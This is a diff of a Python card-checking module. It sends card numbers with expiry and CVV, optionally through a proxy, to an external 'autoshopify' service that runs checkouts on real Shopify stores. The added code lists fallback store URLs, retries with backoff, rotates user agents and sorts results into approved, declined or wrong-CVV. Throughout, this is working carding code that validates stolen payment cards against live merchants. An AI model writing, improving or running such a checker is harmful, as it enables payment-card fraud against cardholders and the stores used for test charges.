@@ -1,6 +1,7 @@
 import httpx
 import random
 import asyncio
+from typing import Optional
 
 # User agents for requests
 USER_AGENTS = [
@@ -13,13 +14,151 @@ USER_AGENTS = [
 # Base autoshopify URL
 AUTOSHOPIFY_BASE_URL = "https://autosh-production-b437.up.railway.app/process"
 
+# Fallback product URLs - Multiple working Shopify stores
+FALLBACK_PRODUCT_URLS = [
+    "https://kettleandfire.myshopify.com/products/bone-broth",
+    "https://kobo-us.myshopify.com/products/clara-2e",
+    "https://habit-nest.myshopify.com/products/morning-sidekick-journal",
+    "https://junk-brands.myshopify.com/products/headband",
+    "https://confetti-usa.myshopify.com/products/confetti-system",
+    "https://nixplay.myshopify.com/products/smart-photo-frame",
+    "https://coyotevest.myshopify.com/products/coyote-vest",
+]
+
+# Retry configuration
+MAX_RETRIES = 3
+RETRY_DELAYS = [2, 4, 8]  # Exponential backoff in seconds
+
+async def _make_request(card_data: str, site: str, proxy: Optional[str], headers: dict) -> dict:
+    """
+    Internal function to make a single request to AutoShopify backend
+
+    Returns:
+        dict with response data or error information
+    """
+    params = {
+        "cc": card_data,
+        "site": site
+    }
+
+    if proxy:
+        params["proxy"] = proxy
+
+    async with httpx.AsyncClient(timeout=90.0, follow_redirects=True) as client:
+        response = await client.get(
+            AUTOSHOPIFY_BASE_URL,
+            params=params,
+            headers=headers
+        )
+
+        response_text = response.text
+        response_json = None
+
+        try:
+            response_json = response.json()
+        except:
+            pass
+
+        return {
+            "status_code": response.status_code,
+            "text": response_text,
+            "json": response_json
+        }
+
+
+def _parse_response(response_data: dict) -> dict:
+    """
+    Parse and interpret the AutoShopify response
+
+    Returns:
+        dict with status, message, and response
+    """
+    status_code = response_data["status_code"]
+    response_text = response_data["text"]
+    response_json = response_data["json"]
+
+    if status_code == 200:
+        response_lower = response_text.lower()
+
+        # Check for specific error cases first
+        if "handle is empty" in response_lower:
+            return {
+                "status": "ERROR",
+                "message": "Product handle error. The product URL is invalid or the product doesn't exist.",
+                "response": response_json or response_text,
+                "should_retry_with_fallback": True
+            }
+
+        if "proposal step failed" in response_lower:
+            return {
+                "status": "ERROR",
+                "message": "Checkout failed. The store may be blocking requests or the product is unavailable.",
+                "response": response_json or response_text,
+                "should_retry_with_fallback": True
+            }
+
+        # Check for success/decline/ccn indicators
+        if any(word in response_lower for word in ["approved", "success", "charged", "cvv match"]):
+            return {
+                "status": "APPROVED",
+                "message": response_text[:500],
+                "response": response_json or response_text,
+                "should_retry_with_fallback": False
+            }
+        elif any(word in response_lower for word in ["declined", "insufficient", "card declined"]):
+            return {
+                "status": "DECLINED",
+                "message": response_text[:500],
+                "response": response_json or response_text,
+                "should_retry_with_fallback": False
+            }
+        elif any(word in response_lower for word in ["incorrect", "invalid", "wrong cvv"]):
+            return {
+                "status": "CCN",
+                "message": response_text[:500],
+                "response": response_json or response_text,
+                "should_retry_with_fallback": False
+            }
+        else:
+            return {
+                "status": "UNKNOWN",
+                "message": response_text[:500],
+                "response": response_json or response_text,
+                "should_retry_with_fallback": False
+            }
+
+    elif status_code == 403:
+        return {
+            "status": "ERROR",
+            "message": "Backend service access denied (403). Network or proxy configuration issue.",
+            "response": response_text[:200],
+            "should_retry_with_fallback": False
+        }
+
+    elif status_code == 502 or status_code == 503:
+        return {
+            "status": "ERROR",
+            "message": f"Backend service unavailable (HTTP {status_code}). Service may be down.",
+            "response": response_text[:200],
+            "should_retry_with_fallback": False
+        }
+
+    else:
+        return {
+            "status": "ERROR",
+            "message": f"HTTP {status_code}: {response_text[:200]}",
+            "response": response_text,
+            "should_retry_with_fallback": False
+        }
+
+
 async def check_autoshopify(card_data: str, site: str = None, proxy: str = None) -> dict:
     """
-    Check a card using the autoshopify service
+    Check a card using the autoshopify service with retry and fallback logic
 
     Args:
         card_data: Card in format cc|mm|yy|cvv
-        site: Optional site URL with product (defaults to kettleandfire.myshopify.com/products/bone-broth)
+        site: Optional site URL with product (defaults to fallback URLs)
         proxy: Optional proxy string
 
     Returns:
@@ -37,18 +176,16 @@ async def check_autoshopify(card_data: str, site: str = None, proxy: str = None)
 
         cc, mm, yy, cvv = parts
 
-        # Default site if not provided - must include a product URL
-        if not site:
-            site = "https://kettleandfire.myshopify.com/products/bone-broth"
-
-        # Build request URL
-        params = {
-            "cc": card_data,
-            "site": site
-        }
-
-        if proxy:
-            params["proxy"] = proxy
+        # Prepare sites to try
+        sites_to_try = []
+        if site:
+            # User provided a custom site - try it first
+            sites_to_try.append(site)
+            # Add fallback URLs as backup
+            sites_to_try.extend(FALLBACK_PRODUCT_URLS[:3])
+        else:
+            # Use all fallback URLs
+            sites_to_try = FALLBACK_PRODUCT_URLS.copy()
 
         # Random user agent
         headers = {
@@ -57,76 +194,87 @@ async def check_autoshopify(card_data: str, site: str = None, proxy: str = None)
             "Accept-Language": "en-US,en;q=0.9"
         }
 
-        # Make request with timeout
-        async with httpx.AsyncClient(timeout=90.0, follow_redirects=True) as client:
-            response = await client.get(
-                AUTOSHOPIFY_BASE_URL,
-                params=params,
-                headers=headers
-            )
+        last_error = None
 
-            # Parse response
-            response_text = response.text
-            response_json = None
+        # Try each site
+        for site_index, current_site in enumerate(sites_to_try):
+            # Try with retries for network errors
+            for attempt in range(MAX_RETRIES):
+                try:
+                    # Make request
+                    response_data = await _make_request(card_data, current_site, proxy, headers)
 
-            try:
-                response_json = response.json()
-            except:
-                pass
+                    # Parse response
+                    result = _parse_response(response_data)
 
-            # Determine status based on response
-            if response.status_code == 200:
-                # Check for common success indicators
-                response_lower = response_text.lower()
+                    # If successful or definitive result, return it
+                    if result["status"] in ["APPROVED", "DECLINED", "CCN"]:
+                        return result
 
-                # Check for specific error cases first
-                if "handle is empty" in response_lower or "proposal step failed" in response_lower:
-                    return {
-                        "status": "ERROR",
-                        "message": "Site configuration error. The product URL may be invalid or inaccessible. Please try again or contact support if the issue persists.",
-                        "response": response_json or response_text
-                    }
+                    # If error but shouldn't retry with fallback, return error
+                    if not result.get("should_retry_with_fallback", False):
+                        last_error = result
+                        # For network/backend errors, try retry
+                        if "Backend service" in result["message"] or "HTTP" in result["message"]:
+                            if attempt < MAX_RETRIES - 1:
+                                await asyncio.sleep(RETRY_DELAYS[attempt])
+                                continue
+                        return result
 
-                if any(word in response_lower for word in ["approved", "success", "charged", "cvv match"]):
-                    return {
-                        "status": "APPROVED",
-                        "message": response_text[:500],
-                        "response": response_json or response_text
-                    }
-                elif any(word in response_lower for word in ["declined", "insufficient", "card declined"]):
-                    return {
-                        "status": "DECLINED",
-                        "message": response_text[:500],
-                        "response": response_json or response_text
-                    }
-                elif any(word in response_lower for word in ["incorrect", "invalid", "wrong cvv"]):
-                    return {
-                        "status": "CCN",
-                        "message": response_text[:500],
-                        "response": response_json or response_text
-                    }
-                else:
-                    return {
-                        "status": "UNKNOWN",
-                        "message": response_text[:500],
-                        "response": response_json or response_text
-                    }
-            else:
-                return {
-                    "status": "ERROR",
-                    "message": f"HTTP {response.status_code}: {response_text[:200]}",
-                    "response": response_text
-                }
+                    # Should retry with next site
+                    last_error = result
+                    break  # Break retry loop, try next site
 
-    except httpx.TimeoutException:
+                except httpx.TimeoutException:
+                    if attempt < MAX_RETRIES - 1:
+                        await asyncio.sleep(RETRY_DELAYS[attempt])
+                        continue
+                    else:
+                        last_error = {
+                            "status": "ERROR",
+                            "message": f"Request timeout after 90 seconds (tried {attempt + 1} times)",
+                            "response": None
+                        }
+                        break  # Try next site
+
+                except httpx.ConnectError as e:
+                    if attempt < MAX_RETRIES - 1:
+                        await asyncio.sleep(RETRY_DELAYS[attempt])
+                        continue
+                    else:
+                        last_error = {
+                            "status": "ERROR",
+                            "message": f"Connection error: Cannot reach backend service",
+                            "response": str(e)
+                        }
+                        break
+
+                except Exception as e:
+                    if attempt < MAX_RETRIES - 1:
+                        await asyncio.sleep(RETRY_DELAYS[attempt])
+                        continue
+                    else:
+                        last_error = {
+                            "status": "ERROR",
+                            "message": f"Error: {str(e)}",
+                            "response": None
+                        }
+                        break
+
+        # All sites and retries exhausted
+        if last_error:
+            last_error["message"] = f"{last_error['message']} (Tried {len(sites_to_try)} different stores)"
+            return last_error
+
         return {
             "status": "ERROR",
-            "message": "Request timeout after 90 seconds",
+            "message": "All attempts failed. Backend service may be unavailable.",
             "response": None
         }
+
     except Exception as e:
         return {
             "status": "ERROR",
-            "message": f"Error: {str(e)}",
+            "message": f"Unexpected error: {str(e)}",
             "response": None
         }
